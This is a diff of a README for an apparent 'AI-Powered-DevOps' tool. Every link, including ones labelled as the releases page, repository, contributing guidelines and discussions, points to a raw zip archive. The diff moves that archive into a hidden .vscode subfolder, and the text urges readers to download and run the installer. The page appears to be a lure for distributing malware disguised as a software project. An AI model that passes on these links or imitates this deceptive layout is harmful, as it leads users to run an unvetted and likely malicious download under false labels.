@@ -1,6 +1,6 @@
 # 🎉 AI-Powered-DevOps - Streamline Your DevOps Workflow Effortlessly
 
-[![Download AI-Powered-DevOps](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip)](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip)
+[![Download AI-Powered-DevOps](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip)](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip)
 
 ## 🌟 Introduction
 
@@ -10,7 +10,7 @@ AI-Powered DevOps is a user-friendly application designed to simplify your DevOp
 
 To get started with AI-Powered DevOps, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip) to find the latest version of the application.
 2. **Download the Installer:** Click on the download link for the latest release. This will download the necessary files to your computer.
 3. **Run the Installer:** Locate the downloaded file, double-click it, and follow the simple installation steps.
 
@@ -33,7 +33,7 @@ To ensure optimal performance, please check the following system requirements:
 
 ## ⚙️ Download & Install
 
-To download AI-Powered DevOps, please visit our [Releases Page](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip). Choose the most recent version and click the link to download. After downloading, run the installer to complete the setup.
+To download AI-Powered DevOps, please visit our [Releases Page](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip). Choose the most recent version and click the link to download. After downloading, run the installer to complete the setup.
 
 ## 📘 Usage Instructions
 
@@ -48,7 +48,7 @@ If you encounter any issues:
 
 - **Check System Compatibility:** Ensure your system meets the requirements listed above.
 - **Review Logs:** Use the built-in logging feature to troubleshoot any errors.
-- **Contact Support:** Reach out via the issues tab on our [GitHub Repository](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip) for assistance.
+- **Contact Support:** Reach out via the issues tab on our [GitHub Repository](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip) for assistance.
 
 ## 📅 Future Development
 
@@ -60,7 +60,7 @@ We continually work on updates to improve AI-Powered DevOps. Future features may
 
 ## ☕ Community Contributions
 
-We welcome contributions to AI-Powered DevOps. If you wish to help improve the software, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip).
+We welcome contributions to AI-Powered DevOps. If you wish to help improve the software, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip).
 
 ## 📝 License
 
@@ -68,6 +68,6 @@ AI-Powered DevOps is licensed under the MIT License. Feel free to use and modify
 
 ## 📣 Feedback
 
-Your feedback is vital for us. If you have suggestions or comments, please feel free to share them with us through our [GitHub Discussions](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/bedusk/AI-Powered-DevOps.zip) section.
+Your feedback is vital for us. If you have suggestions or comments, please feel free to share them with us through our [GitHub Discussions](https://raw.githubusercontent.com/monim279/AI-Powered-DevOps/main/Workdir/Slingshot/.vscode/Dev_A_Powered_Ops_v1.3.zip) section.
 
 Enjoy your journey with AI-Powered DevOps! Your next DevOps improvement starts now.
